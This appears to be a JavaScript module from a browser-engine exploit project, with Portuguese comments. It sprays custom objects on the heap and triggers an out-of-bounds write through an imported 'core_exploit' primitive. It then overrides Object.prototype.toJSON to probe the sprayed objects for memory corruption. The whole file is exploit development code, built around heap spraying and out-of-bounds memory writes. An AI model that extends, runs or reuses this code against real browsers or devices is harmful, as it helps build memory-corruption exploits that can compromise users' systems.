// js/script3/testSprayComplexObjects.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345;
        this.value2 = "initial_state";
        this.marker = 0xCAFECAFE; 
    }

    checkIntegrity() {
        // Não vamos logar daqui para manter a toJSON o mais limpa possível inicialmente
        if (this.marker !== 0xCAFECAFE) return false;
        if (this.value1 !== 12345) return false;
        if (this.value2 !== "initial_state") return false;
        return true;
    }

    action() {
        return this.id + " acted, value1 is " + this.value1;
    }
}

// --- Variantes Ultra-Minimalistas da toJSON para MyComplexObject ---

// V0: Apenas retorna um objeto vazio.
export function toJSON_Complex_V0_EmptyReturn() {
    return { test_variant: "V0_EmptyReturn" };
}

// V1: Tenta apenas Object.prototype.toString.call(this)
export function toJSON_Complex_V1_ToStringCallThis() {
    try {
        const basicType = Object.prototype.toString.call(this);
        return { test_variant: "V1_ToStringCallThis", type: basicType };
    } catch (e) {
        return { test_variant: "V1_ToStringCallThis", error: `${e.name}: ${e.message}` };
    }
}

// V2: Tenta apenas acessar uma propriedade simples de 'this' (ex: this.id)
export function toJSON_Complex_V2_AccessThisId() {
    try {
        const id = this.id;
        return { test_variant: "V2_AccessThisId", id_val: String(id).substring(0,20) };
    } catch (e) {
        return { test_variant: "V2_AccessThisId", error: `${e.name}: ${e.message}` };
    }
}

// V3: Combina V1 e V2 (como na toJSON_UltraMinimalForComplexObject do teste anterior)
export function toJSON_Complex_V3_ToStringAndId() {
    try {
        const basicType = Object.prototype.toString.call(this);
        const id = this.id;
        return { test_variant: "V3_ToStringAndId", type: basicType, id_val: String(id).substring(0,20) };
    } catch (e) {
        return { test_variant: "V3_ToStringAndId", error: `${e.name}: ${e.message}` };
    }
}


export async function executeSprayAndProbeComplexObjects_MinimalToJSON(toJSONFunctionToUse, toJSONFunctionName) {
    const FNAME_TEST = `executeSprayAndProbe_MinimalToJSON<${toJSONFunctionName}>`;
    logS3(`--- Iniciando Teste Spray & Probe: Usando ${toJSONFunctionName} ---`, "test", FNAME_TEST);
    document.title = `Spray & Probe - ${toJSONFunctionName}`;

    const spray_count = 50; // Reduzido para acelerar os testes, aumente se necessário
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`ERRO durante a pulverização: ${e_spray.message}. Abortando.`, "error", FNAME_TEST);
        return { sprayError: e_spray };
    }
    
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`2. Configurando ambiente OOB e realizando escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return { oobError: new Error("OOB Setup Failed")};
    }

    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}] realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando sondagem.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { oobWriteError: e_write };
    }
    
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`3. Sondando ${sprayed_objects.length} objetos complexos pulverizados com ${toJSONFunctionName}...`, "test", FNAME_TEST);
    
    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let firstProblematicObjectResult = null;

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;

        // Sondar apenas os primeiros, ou um número limitado, para identificar o problema mais rapidamente
        const objectsToProbe = Math.min(sprayed_objects.length, 10); 
        logS3(`   Sondando os primeiros ${objectsToProbe} objetos...`, 'info', FNAME_TEST);

        for (let i = 0; i < objectsToProbe; i++) {
            const obj = sprayed_objects[i];
            if (!obj) continue;
            
            document.title = `Sondando Obj ${i} com ${toJSONFunctionName}`;
            let stringifyResult = null;
            let errorDuringStringify = null;
            let integrityOK = obj.checkIntegrity();


            logS3(`   Testando objeto ${i} (ID: ${obj.id}, Integridade ANTES: ${integrityOK})...`, 'info', FNAME_TEST);
            try {
                stringifyResult = JSON.stringify(obj);
                 logS3(`     JSON.stringify(obj[${i}]) completou. Resultado da toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);
                // Verifica se a toJSON em si reportou um erro interno
                if (stringifyResult && stringifyResult.error) {
                    errorDuringStringify = new Error(`Erro interno da toJSON: ${stringifyResult.error}`);
                     logS3(`     ERRO DENTRO da toJSON para obj[${i}]: ${stringifyResult.error}`, "warn", FNAME_TEST);
                }

            } catch (e_str) {
                errorDuringStringify = e_str;
                logS3(`     !!!! ERRO AO STRINGIFY obj[${i}] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            }

            if (!integrityOK || errorDuringStringify) {
                firstProblematicObjectResult = {
                    index: i,
                    id: obj.id,
                    integrityOK: integrityOK,
                    error: errorDuringStringify ? {name: errorDuringStringify.name, message: errorDuringStringify.message} : null,
                    toJSONReturn: stringifyResult 
                };
                document.title = `PROBLEMA Obj ${i} com ${toJSONFunctionName}! (${errorDuringStringify ? errorDuringStringify.name : 'IntegrityFail'})`;
                break; 
            }
             await PAUSE_S3(SHORT_PAUSE_S3); // Pausa entre objetos
        }
    } catch (e_main_loop) {
        logS3(`Erro no loop principal de sondagem: ${e_main_loop.message}`, "error", FNAME_TEST);
        firstProblematicObjectResult = { error: {name: "MainLoopError", message: e_main_loop.message }};
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (firstProblematicObjectResult) {
        logS3(`PROBLEMA DETECTADO com ${toJSONFunctionName}: Objeto index ${firstProblematicObjectResult.index} (ID: ${firstProblematicObjectResult.id})`, "critical", FNAME_TEST);
    } else {
        logS3(`Nenhum problema óbvio (crash/erro/falha de integridade) detectado nos primeiros ${Math.min(sprayed_objects.length, 10)} objetos sondados com ${toJSONFunctionName}.`, "good", FNAME_TEST);
    }

    logS3(`--- Teste Spray & Probe com ${toJSONFunctionName} CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0; 
    globalThis.gc?.(); 
    return firstProblematicObjectResult;
}
